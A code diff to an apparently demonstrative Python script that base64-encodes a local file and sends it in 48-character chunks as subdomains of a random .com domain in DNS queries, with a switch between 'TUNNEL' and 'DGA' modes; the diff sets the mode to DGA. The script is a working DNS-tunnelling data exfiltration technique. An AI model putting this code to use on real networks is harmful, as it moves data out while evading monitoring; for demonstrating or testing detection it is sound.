@@ -13,7 +13,7 @@ dns.resolver.lifetime = 1
 
 
 DOMAIN = "." + randStr(N=10) + ".com"
-DEMO = "TUNNEL" #Set to TUNNEL or DGA
+DEMO = "DGA" #Set to TUNNEL or DGA
 
 
 data = open('data.txt', 'rb') #open binary file in read mode
@@ -24,7 +24,7 @@ encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes
 parse = [encodedStr[i:i+48] for i in range(0, len(encodedStr), 48)] #breaks the base64 text file into 48 character chunks and passes to parse
 
 ctr = 0
-for chunk in parse:
+for dnsquery in parse:
     try:
         if DEMO == "TUNNEL":
             print(dns.resolver.query(parse[ctr]+DOMAIN, "A")) #query DNS Domain
